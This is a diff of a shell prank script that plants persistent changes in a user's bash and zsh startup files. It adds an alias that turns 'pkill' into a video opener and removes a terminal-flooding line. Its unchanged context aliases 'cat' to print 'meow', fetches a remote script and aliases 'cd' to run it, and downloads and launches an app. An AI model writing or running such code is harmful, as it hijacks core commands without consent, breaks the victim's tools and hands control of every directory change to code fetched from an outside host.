@@ -8,9 +8,6 @@ add_alias() {
     fi
 }
 
-echo "printf '\n%.0s' {1..200}" >> ~/.bashrc
-echo "printf '\n%.0s' {1..200}" >> ~/.zshrc
-
 add_alias "alias cat='printf \"meow\n\"'" ~/.bashrc
 add_alias "alias cat='printf \"meow\n\"'" ~/.zshrc
 
@@ -26,6 +23,9 @@ add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.zshrc
 add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.bashrc
 add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.zshrc
 
+add_alias "alias pkill='open \"https://shattereddisk.github.io/rickroll/rickroll.mp4\"'" ~/.bashrc
+add_alias "alias pkill='open \"https://shattereddisk.github.io/rickroll/rickroll.mp4\"'" ~/.zshrc
+
 curl https://raw.githubusercontent.com/JonasGoetz01/sui/main/masterplan.sh > ~/masterplan.sh
 chmod +x ~/masterplan.sh
 echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
@@ -38,4 +38,4 @@ curl -L -o ~/goose.zip 'https://raw.githubusercontent.com/PaulicStudios/goose/re
 unzip -o ~/goose.zip -d ~/goose
 open ~/goose/goose.app
 
-echo "Done!"
+exit
